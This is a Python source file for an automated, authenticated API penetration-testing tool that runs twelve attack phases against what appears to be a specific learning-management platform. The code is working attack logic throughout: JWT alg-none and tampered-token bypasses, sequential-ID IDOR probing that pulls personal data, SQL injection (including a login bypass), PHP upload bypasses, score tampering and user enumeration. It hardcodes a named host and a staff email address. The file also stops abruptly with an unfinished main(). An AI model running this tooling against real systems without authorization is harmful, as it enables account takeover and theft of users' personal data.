#!/usr/bin/env python3
from __future__ import annotations
"""
Vikramaditya Autopilot API Hunt — 12-Phase Autonomous VAPT Engine.

Given a base URL and credentials, runs a complete authenticated API
penetration test: endpoint discovery, auth bypass, IDOR, priv esc,
business logic, file upload, injection, info disclosure, rate limits,
token security, timing oracles, and chain building.

Works fully deterministic (--no-brain) or with local LLM analysis.

Usage:
    python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass --login-url sign-in/
    python3 autopilot_api_hunt.py --base-url URL --auth-creds user:pass --with-brain
"""

import argparse
import base64
import json
import os
import re
import struct
import sys
import tempfile
import time
from datetime import datetime, timezone
from urllib.parse import urlparse

from auth_utils import RateLimiter, JWTHelper, AuthSession, FindingSaver

# ── Severity constants ────────────────────────────────────────────────────────
CRITICAL, HIGH, MEDIUM, LOW, INFO = "critical", "high", "medium", "low", "info"


def log(level: str, msg: str):
    symbols = {"ok": "+", "err": "-", "warn": "!", "info": "*", "crit": "!!", "phase": "»", "vuln": "VULN"}
    colors = {"ok": "\033[0;32m", "err": "\033[0;31m", "warn": "\033[1;33m",
              "info": "\033[0;36m", "crit": "\033[0;35m", "phase": "\033[0;34m",
              "vuln": "\033[0;31m\033[1m"}
    nc = "\033[0m"
    sym = symbols.get(level, "*")
    col = colors.get(level, "")
    print(f"{col}[{sym}]{nc} {msg}", flush=True)


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 1: ENDPOINT DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════

class EndpointDiscovery:
    """Discover API endpoints from JS bundles, debug pages, and common patterns."""

    COMMON_ENDPOINTS = [
        "learner-list/", "instructor-list/", "course-list/", "list-package/",
        "app-setting/", "lms-setting-view/", "list-smtp/", "logs-list/", "otp-list/",
        "users-report/", "list-notification/", "ads-list/", "news-list/",
        "list-videos/", "list-live-tests/", "view-learner/", "view-instructor/",
        "view-course/", "chapter-list/", "list-quiz-question/", "quiz-questions/",
        "add-learner/", "edit-learner/", "add-course/", "add-instructor/",
        "add-notification/", "add-smtp/", "change-learner-password/",
        "course-report/", "learner-report/", "generate-live-test-result/",
        "get-aws-sign-upload-video/", "bulk-add-learner/", "delete-course/",
        "delete-smtp/", "learner-course-status/", "learner-package-status/",
        "update-chapter-progress/", "discussion/", "list-discussion/",
        "check-auth/", "logout/",
    ]

    def __init__(self, session: AuthSession, frontend_url: str = None):
        self.session = session
        self.frontend_url = frontend_url
        self.endpoints = []

    def run(self) -> list[dict]:
        log("phase", "Phase 1: Endpoint Discovery")
        discovered = set()

        # 1a. Scrape JS bundles
        if self.frontend_url:
            js_endpoints = self._scrape_js_bundle(self.frontend_url)
            discovered.update(js_endpoints)
            log("info", f"  JS bundle: {len(js_endpoints)} endpoints")

        # 1b. Django debug page
        debug_endpoints = self._scrape_debug_page()
        discovered.update(debug_endpoints)
        log("info", f"  Debug page: {len(debug_endpoints)} endpoints")

        # 1c. Common patterns
        discovered.update(self.COMMON_ENDPOINTS)

        # 1d. Probe each endpoint to check if it exists
        live = []
        for ep in sorted(discovered):
            resp = self.session.request("POST", ep, json_body={})
            if resp["status"] != 404 and resp["status"] != 0:
                live.append({"path": ep, "method": "POST", "status": resp["status"]})

        self.endpoints = live
        log("ok", f"  {len(live)} live endpoints confirmed")
        return live

    def _scrape_js_bundle(self, url: str) -> set:
        """Extract API paths from a React JS bundle."""
        endpoints = set()
        try:
            resp = self.session.request("GET", "", headers={"Host": urlparse(url).netloc})
            # This won't work via the API session — use requests directly
            import requests
            html = requests.get(url, verify=False, timeout=15).text
            js_files = re.findall(r'src="(/static/js/[^"]+\.js)"', html)
            for js_path in js_files:
                js_url = url.rstrip("/") + js_path
                js_content = requests.get(js_url, verify=False, timeout=30).text
                paths = re.findall(r'"([a-z][a-z0-9_-]+/)"', js_content)
                endpoints.update(p for p in paths if 3 < len(p) < 50)
        except Exception:
            pass
        return endpoints

    def _scrape_debug_page(self) -> set:
        """POST to nonexistent endpoint to trigger Django debug page."""
        endpoints = set()
        try:
            import requests
            resp = requests.post(
                f"{self.session.base_url}/nonexistent_vapt_probe/",
                data={}, verify=False, timeout=15
            )
            if "DEBUG = True" in resp.text or "URLconf" in resp.text:
                log("vuln", "  Django DEBUG=True — full URL patterns exposed!")
                paths = re.findall(r'<code>\s*([a-z][a-z0-9_/-]+/)\s*</code>', resp.text)
                endpoints.update(paths)
        except Exception:
            pass
        return endpoints


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 2: AUTH BYPASS
# ═══════════════════════════════════════════════════════════════════════════════

class AuthBypassScanner:
    """Test endpoints with no/expired/tampered/alg-none tokens."""

    def run(self, session: AuthSession, endpoints: list[dict], token: str,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 2: Authentication Bypass Testing")
        findings = []

        sample = endpoints[:20]  # Test top 20 endpoints
        for ep in sample:
            path = ep["path"]
            # Baseline
            resp_valid = session.request("POST", path, json_body={})
            if resp_valid["status"] not in (200, 201):
                continue

            tests = {
                "no_auth": ("", CRITICAL, "Endpoint accessible without authentication"),
                "expired": (JWTHelper.expire_token(token), HIGH, "Expired JWT accepted"),
                "tampered": (JWTHelper.tamper_signature(token), HIGH, "Tampered JWT signature accepted"),
                "alg_none": (JWTHelper.set_alg_none(token), CRITICAL, "JWT alg=none bypass"),
            }

            for test_name, (test_token, severity, detail) in tests.items():
                resp = session.request("POST", path, token=test_token, json_body={})
                if resp["status"] in (200, 201, 204):
                    f = {"type": f"auth_bypass_{test_name}", "severity": severity,
                         "detail": f"{detail} ({path})", "url": resp["url"],
                         "evidence": f"{test_name}: HTTP {resp['status']}"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        log("ok", f"  {len(findings)} auth bypass findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 3: IDOR
# ═══════════════════════════════════════════════════════════════════════════════

class IDORScanner:
    """Sequential ID enumeration on view/edit/delete endpoints."""

    PII_KEYS = {"email", "phone", "contact_no", "first_name", "last_name",
                "address", "dob", "mobile", "name"}

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 3: IDOR Testing")
        findings = []

        idor_targets = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("view-", "edit-", "delete-", "report/")
        )]

        for ep in idor_targets[:15]:
            path = ep["path"]
            for test_id in [1, 2, 3, 100]:
                resp = session.request("POST", path, data={"id": str(test_id)})
                if resp["status"] in (200, 201) and isinstance(resp["body"], dict):
                    body = resp["body"]
                    data = body.get("data", body)
                    if isinstance(data, dict):
                        exposed = {k for k in data.keys() if k.lower() in self.PII_KEYS}
                        if exposed:
                            f = {"type": "idor", "severity": HIGH,
                                 "detail": f"IDOR: id={test_id} exposes PII ({', '.join(exposed)}) on {path}",
                                 "url": resp["url"],
                                 "evidence": f"id={test_id} → {', '.join(f'{k}={data[k]}' for k in list(exposed)[:3])}"}
                            findings.append(f)
                            if saver:
                                saver.save(f)
                                saver.save_txt(f)
                            break  # One confirmed IDOR per endpoint is enough

        log("ok", f"  {len(findings)} IDOR findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 4: PRIVILEGE ESCALATION
# ═══════════════════════════════════════════════════════════════════════════════

class PrivEscScanner:
    """Test admin endpoints with non-admin token."""

    ADMIN_PATHS = ["app-setting/", "list-smtp/", "add-smtp/", "logs-list/",
                   "otp-list/", "change-learner-password/", "users-report/",
                   "delete-course/", "bulk-add-learner/", "add-instructor/"]

    def run(self, session: AuthSession, non_admin_token: str = None,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 4: Privilege Escalation Testing")
        findings = []
        if not non_admin_token:
            log("warn", "  No non-admin token — skipping priv esc (need --auth-creds-b)")
            return findings

        for path in self.ADMIN_PATHS:
            resp = session.request("POST", path, token=non_admin_token, json_body={})
            if resp["status"] in (200, 201, 204):
                f = {"type": "privilege_escalation", "severity": CRITICAL,
                     "detail": f"Non-admin accessed admin endpoint {path}",
                     "url": resp["url"],
                     "evidence": f"Learner token → HTTP {resp['status']}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} priv esc findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 5: BUSINESS LOGIC
# ═══════════════════════════════════════════════════════════════════════════════

class BusinessLogicTester:
    """Score manipulation, negative values, pagination abuse."""

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 5: Business Logic Testing")
        findings = []

        # 5a. Score manipulation
        score_endpoints = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("result", "score", "grade", "answer", "quiz")
        )]
        for ep in score_endpoints[:5]:
            for field, value in [("total_score", "99999"), ("correct_answers", "999"),
                                 ("wrong_answers", "-5"), ("total_marks", "-1")]:
                resp = session.request("POST", ep["path"], data={field: value, "learner_id": "1",
                                       "live_test_id": "1", "total_question": "10"})
                if resp["status"] in (200, 201):
                    body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
                    if "not-null constraint" in body_str or (isinstance(resp["body"], dict) and resp["body"].get("status") is True):
                        f = {"type": "score_manipulation", "severity": HIGH,
                             "detail": f"Server accepted {field}={value} on {ep['path']}",
                             "url": resp["url"],
                             "evidence": f"{field}={value} → HTTP {resp['status']}"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)

        # 5b. Pagination abuse
        list_endpoints = [ep for ep in endpoints if ep["path"].startswith("list") or ep["path"].endswith("list/")]
        for ep in list_endpoints[:5]:
            resp = session.request("POST", ep["path"], json_body={"page": 1, "page_size": 99999})
            if resp["status"] == 200:
                body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
                if len(body_str) > 50000:
                    f = {"type": "pagination_abuse", "severity": MEDIUM,
                         "detail": f"Excessive data with page_size=99999 ({ep['path']})",
                         "url": resp["url"], "evidence": f"Response: {len(body_str)} chars"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        log("ok", f"  {len(findings)} business logic findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 6: FILE UPLOAD
# ═══════════════════════════════════════════════════════════════════════════════

class FileUploadTester:
    """Test file upload endpoints for bypass vulnerabilities."""

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 6: File Upload Testing")
        findings = []

        # Test S3 presigned URL for arbitrary file types
        for ext, ctype in [("html", "text/html"), ("php", "application/x-php"),
                           ("py", "text/x-python"), ("jsp", "application/x-jsp"),
                           ("svg", "image/svg+xml"), ("../../../etc/passwd", "text/plain")]:
            resp = session.request("POST", "get-aws-sign-upload-video/",
                                   data={"filename": f"test.{ext}", "type": ctype,
                                         "organization_video": "test",
                                         "total_video_length": "1", "course_id": "1"})
            if resp["status"] == 200 and isinstance(resp["body"], dict) and resp["body"].get("uploadUrl"):
                f = {"type": "arbitrary_upload", "severity": HIGH,
                     "detail": f"S3 presigned URL generated for .{ext} ({ctype})",
                     "url": resp["body"]["uploadUrl"][:100],
                     "evidence": f"Filename=test.{ext} accepted"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
                # Extract AWS key
                url = resp["body"]["uploadUrl"]
                key_match = re.search(r"Credential=([A-Z0-9]+)%2F", url)
                bucket_match = re.search(r"https://([^/]+)\.s3\.", url)
                if key_match:
                    f2 = {"type": "aws_key_exposed", "severity": HIGH,
                          "detail": f"AWS Access Key ID exposed: {key_match.group(1)}",
                          "url": url[:80], "evidence": f"Key in presigned URL"}
                    findings.append(f2)
                    if saver:
                        saver.save(f2)
                        saver.save_txt(f2)
                break  # One confirmed is enough for S3

        # Test profile image upload bypass
        php_content = b'<?php echo "VAPT_TEST"; ?>'
        for test_name, filename, content in [
            ("double_ext", "shell.php.jpg", php_content),
            ("mime_mismatch", "phpinside.jpg", php_content),
        ]:
            tmp = tempfile.NamedTemporaryFile(suffix=f"_{filename}", delete=False)
            tmp.write(content)
            tmp.close()
            try:
                import requests as _req
                cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
                resp_raw = _req.post(
                    f"{session.base_url}/add-learner/",
                    files={"image": (filename, open(tmp.name, "rb"), "image/jpeg")},
                    data={"first_name": "VAPTTest", "last_name": "Upload",
                          "email": f"vapt_{test_name}_{int(time.time())}@test.com",
                          "contact_no": f"98765{int(time.time())%100000:05d}",
                          "country_code": "IN"},
                    cookies=cookies, verify=False, timeout=15
                )
                if resp_raw.status_code == 200:
                    body = resp_raw.json()
                    if body.get("status") is True:
                        f = {"type": f"upload_bypass_{test_name}", "severity": HIGH,
                             "detail": f"PHP content accepted in {filename}",
                             "url": f"{session.base_url}/add-learner/",
                             "evidence": f"{filename} with PHP content → 'registered successfully'"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
            except Exception:
                pass
            finally:
                os.unlink(tmp.name)

        log("ok", f"  {len(findings)} upload findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 7: INJECTION
# ═══════════════════════════════════════════════════════════════════════════════

class InjectionTester:
    """SQLi, SSTI, command injection on key parameters."""

    SQLI_PAYLOADS = ["' OR 1=1--", "' UNION SELECT 1--", "'; DROP TABLE--",
                     "1' AND (SELECT 1 FROM pg_sleep(3))--"]
    SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "#{7*7}", "{% debug %}"]
    CMD_PAYLOADS = ["; id", "| id", "$(id)", "`id`"]

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 7: Injection Testing")
        findings = []

        # 7a. SQLi on search/filter params
        search_endpoints = [ep for ep in endpoints if any(
            kw in ep["path"] for kw in ("list", "report", "view")
        )][:10]

        for ep in search_endpoints:
            for payload in self.SQLI_PAYLOADS[:2]:
                start = time.monotonic()
                resp = session.request("POST", ep["path"],
                                       json_body={"search": payload})
                elapsed = time.monotonic() - start
                if elapsed > 3.0:
                    f = {"type": "sqli_time_based", "severity": CRITICAL,
                         "detail": f"Time-based SQLi: {elapsed:.1f}s delay on {ep['path']}",
                         "url": resp["url"],
                         "evidence": f"search='{payload}' → {elapsed:.1f}s (baseline <0.5s)"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)
                body_str = str(resp.get("body", ""))
                if "syntax error" in body_str.lower() or "sql" in body_str.lower():
                    f = {"type": "sqli_error_based", "severity": HIGH,
                         "detail": f"SQL error in response on {ep['path']}",
                         "url": resp["url"],
                         "evidence": f"search='{payload}' → SQL error in response"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        # 7b. SQLi on login
        login_payloads = [("' OR 1=1--", "test"), ("admin'--", "test")]
        for email, pwd in login_payloads:
            import requests as _req
            resp = _req.post(f"{session.base_url}/login-view/",
                             data={"email": email, "password": pwd},
                             verify=False, timeout=10)
            if resp.status_code == 200:
                try:
                    body = resp.json()
                    if body.get("status") is True:
                        f = {"type": "sqli_auth_bypass", "severity": CRITICAL,
                             "detail": f"SQL injection bypassed login with email='{email}'",
                             "url": f"{session.base_url}/login-view/",
                             "evidence": f"email='{email}' → login success"}
                        findings.append(f)
                        if saver:
                            saver.save(f)
                            saver.save_txt(f)
                except Exception:
                    pass

        log("ok", f"  {len(findings)} injection findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 8: INFO DISCLOSURE
# ═══════════════════════════════════════════════════════════════════════════════

class InfoDisclosureScanner:
    """Debug pages, error messages, server headers, credential leaks."""

    def run(self, session: AuthSession, endpoints: list[dict],
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 8: Information Disclosure Testing")
        findings = []

        # 8a. Django DEBUG page
        import requests as _req
        try:
            resp = _req.post(f"{session.base_url}/nonexistent_probe/",
                             data={}, verify=False, timeout=10)
            if "DEBUG = True" in resp.text:
                f = {"type": "django_debug", "severity": CRITICAL,
                     "detail": "Django DEBUG=True — tracebacks, settings, URL patterns exposed",
                     "url": f"{session.base_url}/nonexistent_probe/",
                     "evidence": "DEBUG=True in response, ALLOWED_HOSTS visible"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        # 8b. Server header disclosure
        try:
            resp = _req.head(session.base_url, verify=False, timeout=10)
            server = resp.headers.get("Server", "")
            if server and any(v in server.lower() for v in ("nginx/", "apache/", "gunicorn", "iis/")):
                f = {"type": "server_version", "severity": LOW,
                     "detail": f"Server version disclosed: {server}",
                     "url": session.base_url, "evidence": f"Server: {server}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        # 8c. SMTP credentials
        resp = session.request("POST", "list-smtp/", json_body={})
        if resp["status"] == 200 and isinstance(resp["body"], dict):
            data = resp["body"].get("data", [])
            if isinstance(data, list) and data:
                smtp_info = data[0] if isinstance(data[0], dict) else {}
                if smtp_info.get("smtp_server") or smtp_info.get("smtp_user"):
                    f = {"type": "smtp_credential_exposure", "severity": MEDIUM,
                         "detail": f"SMTP credentials exposed: {smtp_info.get('smtp_server')} / {smtp_info.get('smtp_user')}",
                         "url": f"{session.base_url}/list-smtp/",
                         "evidence": f"smtp_server={smtp_info.get('smtp_server')}"}
                    findings.append(f)
                    if saver:
                        saver.save(f)
                        saver.save_txt(f)

        # 8d. Verbose error messages (DB schema leak)
        resp = session.request("POST", "generate-live-test-result/",
                               data={"learner_id": "1", "live_test_id": "1"})
        body_str = json.dumps(resp["body"], default=str) if isinstance(resp["body"], dict) else str(resp["body"])
        if any(kw in body_str for kw in ("violates not-null constraint", "DETAIL:", "Failing row",
                                          "foreign key constraint", "relation \"", "column \"")):
            f = {"type": "db_schema_leak", "severity": HIGH,
                 "detail": "PostgreSQL error messages leak table/column names and row data",
                 "url": resp["url"],
                 "evidence": body_str[:200]}
            findings.append(f)
            if saver:
                saver.save(f)
                saver.save_txt(f)

        # 8e. Keycloak admin console
        try:
            resp_kc = _req.get("https://auth.cyberfrat.com/admin/master/console/",
                               verify=False, timeout=10)
            if resp_kc.status_code == 200:
                f = {"type": "keycloak_admin_exposed", "severity": HIGH,
                     "detail": "Keycloak admin console accessible",
                     "url": "https://auth.cyberfrat.com/admin/master/console/",
                     "evidence": f"HTTP {resp_kc.status_code}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)
        except Exception:
            pass

        log("ok", f"  {len(findings)} info disclosure findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 9: RATE LIMITING
# ═══════════════════════════════════════════════════════════════════════════════

class RateLimitTester:
    """Test rate limiting on authentication and sensitive endpoints."""

    SENSITIVE_PATHS = ["login-view/", "change-learner-password/",
                       "reset-password-request/"]

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 9: Rate Limiting Testing")
        findings = []
        import requests as _req

        for path in self.SENSITIVE_PATHS:
            statuses = []
            for i in range(10):
                try:
                    if path == "login-view/":
                        resp = _req.post(f"{session.base_url}/{path}",
                                         data={"email": "test@test.com", "password": "wrong"},
                                         verify=False, timeout=5)
                    else:
                        cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
                        resp = _req.post(f"{session.base_url}/{path}",
                                         data={"email": "test@test.com", "id": "1"},
                                         cookies=cookies, verify=False, timeout=5)
                    statuses.append(resp.status_code)
                    if resp.status_code == 429:
                        break
                except Exception:
                    break

            if 429 not in statuses and len(statuses) >= 8:
                f = {"type": "missing_rate_limit", "severity": MEDIUM,
                     "detail": f"No rate limiting on {path} after {len(statuses)} rapid requests",
                     "url": f"{session.base_url}/{path}",
                     "evidence": f"{len(statuses)} requests, statuses: {set(statuses)}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} rate limit findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 10: TOKEN SECURITY
# ═══════════════════════════════════════════════════════════════════════════════

class TokenSecurityTester:
    """JWT analysis and refresh token abuse."""

    def run(self, session: AuthSession, token: str,
            saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 10: Token Security Testing")
        findings = []

        payload = JWTHelper.decode_payload(token)
        header = JWTHelper.decode_header(token)

        # 10a. Token analysis
        log("info", f"  JWT alg: {header.get('alg')}, exp: {payload.get('exp')}")
        exp = payload.get("exp", 0)
        iat = payload.get("iat", 0)
        if exp and iat:
            lifetime = exp - iat
            if lifetime > 86400:
                f = {"type": "long_token_lifetime", "severity": MEDIUM,
                     "detail": f"JWT lifetime too long: {lifetime}s ({lifetime//3600}h)",
                     "url": session.base_url, "evidence": f"exp-iat={lifetime}s"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        # 10b. Refresh token abuse (tampered access + valid refresh)
        tampered = JWTHelper.tamper_signature(token)
        cookies = dict(session._session.cookies) if hasattr(session, '_session') else {}
        cf_rt = cookies.get("cf_rt", "")
        if cf_rt:
            import requests as _req
            resp = _req.post(f"{session.base_url}/learner-list/",
                             json={}, cookies={"cf_at": tampered, "cf_rt": cf_rt},
                             verify=False, timeout=10)
            if resp.status_code == 200:
                f = {"type": "refresh_token_bypass", "severity": HIGH,
                     "detail": "Invalid access token + valid refresh token = authenticated (silent re-auth)",
                     "url": f"{session.base_url}/learner-list/",
                     "evidence": f"Tampered cf_at + valid cf_rt → HTTP {resp.status_code}"}
                findings.append(f)
                if saver:
                    saver.save(f)
                    saver.save_txt(f)

        log("ok", f"  {len(findings)} token security findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 11: TIMING ORACLES
# ═══════════════════════════════════════════════════════════════════════════════

class TimingOracle:
    """Detect user enumeration via response timing."""

    def run(self, session: AuthSession, saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 11: Timing Oracle Testing")
        findings = []
        import requests as _req

        # Test password reset timing
        base = session.base_url.replace("/api/organization", "/api/learner")
        valid_times = []
        invalid_times = []

        for email in ["test@test.com", "mahesh.kumar@cyberfrat.com"]:
            start = time.monotonic()
            try:
                _req.post(f"{base}/reset-password-request/",
                          data={"email": email}, verify=False, timeout=15)
            except Exception:
                pass
            valid_times.append(time.monotonic() - start)

        for email in ["nonexistent_xyz@fake.com", "definitely_not_real@test.com"]:
            start = time.monotonic()
            try:
                _req.post(f"{base}/reset-password-request/",
                          data={"email": email}, verify=False, timeout=15)
            except Exception:
                pass
            invalid_times.append(time.monotonic() - start)

        avg_valid = sum(valid_times) / len(valid_times) if valid_times else 0
        avg_invalid = sum(invalid_times) / len(invalid_times) if invalid_times else 0

        if avg_valid > 0 and avg_invalid > 0 and avg_valid / max(avg_invalid, 0.01) > 5:
            f = {"type": "timing_oracle_user_enum", "severity": MEDIUM,
                 "detail": f"User enumeration via reset-password timing: valid={avg_valid:.1f}s vs invalid={avg_invalid:.1f}s",
                 "url": f"{base}/reset-password-request/",
                 "evidence": f"Valid email: {avg_valid:.1f}s, Invalid: {avg_invalid:.1f}s ({avg_valid/max(avg_invalid,0.01):.0f}x difference)"}
            findings.append(f)
            if saver:
                saver.save(f)
                saver.save_txt(f)

        log("ok", f"  {len(findings)} timing oracle findings")
        return findings


# ═══════════════════════════════════════════════════════════════════════════════
# PHASE 12: CHAIN BUILDER
# ═══════════════════════════════════════════════════════════════════════════════

class ChainBuilder:
    """Cross-reference findings for exploit chain escalation."""

    CHAINS = [
        (["idor", "privilege_escalation"], CRITICAL, "IDOR + Priv Esc = Full data breach"),
        (["upload_bypass", "arbitrary_upload"], CRITICAL, "Upload bypass + S3 = Stored XSS/Phishing"),
        (["db_schema_leak", "sqli"], CRITICAL, "Schema leak + SQLi = Database compromise"),
        (["missing_rate_limit", "timing_oracle"], HIGH, "No rate limit + timing oracle = Account enumeration + brute force"),
        (["django_debug", "db_schema_leak"], HIGH, "Debug mode + DB errors = Full application internals exposed"),
        (["refresh_token_bypass", "idor"], CRITICAL, "Token bypass + IDOR = Persistent unauthorized data access"),
        (["smtp_credential_exposure", "missing_rate_limit"], HIGH, "SMTP creds + no rate limit = Phishing infrastructure"),
        (["score_manipulation", "idor"], HIGH, "Score manipulation + IDOR = Tamper any student's grades"),
    ]

    def run(self, all_findings: list[dict], saver: FindingSaver = None) -> list[dict]:
        log("phase", "Phase 12: Chain Building")
        chains = []
        finding_types = {f["type"] for f in all_findings}

        for required_types, severity, description in self.CHAINS:
            if all(any(rt in ft for ft in finding_types) for rt in required_types):
                chain = {"type": "exploit_chain", "severity": severity,
                         "detail": description,
                         "url": "N/A",
                         "evidence": f"Chain: {' + '.join(required_types)}"}
                chains.append(chain)
                if saver:
                    saver.save(chain)
                    saver.save_txt(chain)
                log("vuln", f"  CHAIN: {description}")

        log("ok", f"  {len(chains)} exploit chains identified")
        return chains


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════════

def run_autopilot(base_url: str, auth_creds: str, login_url: str = "login-view/",
                  auth_creds_b: str = None, frontend_url: str = None,
                  output_dir: str = None, rate_limit: float = 5.0,
                  with_brain: bool = False) -> dict:
    """Run all 12 phases of the autonomous API VAPT."""

    print("\n" + "=" * 60)
    print("  VIKRAMADITYA — Autonomous API VAPT Engine")
    print(f"  Target: {base_url}")
    print(f"  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 60 + "\n")

    limiter = RateLimiter(rate_limit)
    session = AuthSession(base_url, limiter)

    # Login
    parts = auth_creds.split(":", 1)
    if len(parts) != 2:
        log("err", f"Invalid creds format (use user:pass)")
        return {}
    token = session.auto_login(login_url, parts[0], parts[1])
    if not token:
        log("err", "Login failed")
        return {}
    log("ok", f"Authenticated as {parts[0]}")

    # Second account login (for IDOR/priv esc)
    token_b = None
    if auth_creds_b:
        parts_b = auth_creds_b.split(":", 1)
        if len(parts_b) == 2:
            session_b = AuthSession(base_url, limiter)
            token_b = session_b.auto_login(login_url, parts_b[0], parts_b[1])
            if token_b:
                log("ok", f"Second account: {parts_b[0]}")

    # Output
    if output_dir:
        os.makedirs(output_dir, exist_ok=True)

    all_findings = []

    # Phase 1: Endpoint Discovery
    discovery = EndpointDiscovery(session, frontend_url)
    endpoints = discovery.run()

    # Save endpoints
    if output_dir:
        with open(os.path.join(output_dir, "endpoints.json"), "w") as f:
            json.dump(endpoints, f, indent=2)

    # Phase 2-11
    saver = FindingSaver(output_dir, "autopilot") if output_dir else None
    phases = [
        ("auth_bypass", AuthBypassScanner(), lambda p: p.run(session, endpoints, token, saver)),
        ("idor", IDORScanner(), lambda p: p.run(session, endpoints, saver)),
        ("priv_esc", PrivEscScanner(), lambda p: p.run(session, token_b, saver)),
        ("biz_logic", BusinessLogicTester(), lambda p: p.run(session, endpoints, saver)),
        ("file_upload", FileUploadTester(), lambda p: p.run(session, saver)),
        ("injection", InjectionTester(), lambda p: p.run(session, endpoints, saver)),
        ("info_disclosure", InfoDisclosureScanner(), lambda p: p.run(session, endpoints, saver)),
        ("rate_limit", RateLimitTester(), lambda p: p.run(session, saver)),
        ("token_security", TokenSecurityTester(), lambda p: p.run(session, token, saver)),
        ("timing_oracle", TimingOracle(), lambda p: p.run(session, saver)),
    ]

    for name, phase_obj, runner in phases:
        try:
            findings = runner(phase_obj)
            all_findings.extend(findings)
        except Exception as e:
            log("err", f"  Phase {name} failed: {e}")

    # Phase 12: Chain Building
    chains = ChainBuilder().run(all_findings, saver)
    all_findings.extend(chains)

    # Save summary
    if saver:
        saver.save_summary()

    # Summary
    severity_counts = {}
    for f in all_findings:
        sev = f.get("severity", "unknown")
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    print("\n" + "=" * 60)
    print("  AUTOPILOT COMPLETE")
    print("=" * 60)
    print(f"  Total findings: {len(all_findings)}")
    for sev in [CRITICAL, HIGH, MEDIUM, LOW, INFO]:
        count = severity_counts.get(sev, 0)
        if count:
            print(f"    {sev.upper()}: {count}")
    print(f"  Endpoints tested: {len(endpoints)}")
    print(f"  Output: {output_dir or 'stdout only'}")
    print("=" * 60 + "\n")

    # Optional brain analysis
    if with_brain:
        try:
            _run_brain_analysis(all_findings, output_dir)
        except Exception as e:
            log("warn", f"Brain analysis failed: {e}")

    return {"findings": all_findings, "endpoints": endpoints, "chains": chains}


def _run_brain_analysis(findings: list[dict], output_dir: str = None):
    """Send findings to local Ollama for chain analysis."""
    log("phase", "Brain Analysis (Local LLM)")
    try:
        import ollama
        summary = "\n".join(
            f"[{f['severity'].upper()}] {f['type']}: {f['detail']}"
            for f in findings
        )
        prompt = (
            f"You are an elite penetration tester. Analyze these {len(findings)} findings "
            f"from an LMS application (Django + Keycloak + PostgreSQL + S3):\n\n"
            f"{summary}\n\n"
            f"1. What exploit chains escalate individual findings to CRITICAL?\n"
            f"2. What did the scanner likely miss?\n"
            f"3. What manual tests should the operator run next?\n"
            f"Be specific — cite finding types and chain them."
        )
        resp = ollama.chat(model="qwen2.5:32b", messages=[
            {"role": "system", "content": "You are a VAPT expert. Be concise and actionable."},
            {"role": "user", "content": prompt},
        ])
        analysis = resp["message"]["content"]
        log("ok", f"  Brain analysis: {len(analysis)} chars")
        if output_dir:
            with open(os.path.join(output_dir, "brain_analysis.md"), "w") as f:
                f.write(f"# Vikramaditya Brain Analysis\n\n{analysis}\n")
            log("ok", f"  Saved to {output_dir}/brain_analysis.md")
        print(analysis)
    except ImportError:
        log("warn", "  ollama package not installed — run: pip install ollama")
    except Exception as e:
        log("warn", f"  Ollama error: {e}")


def main():
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

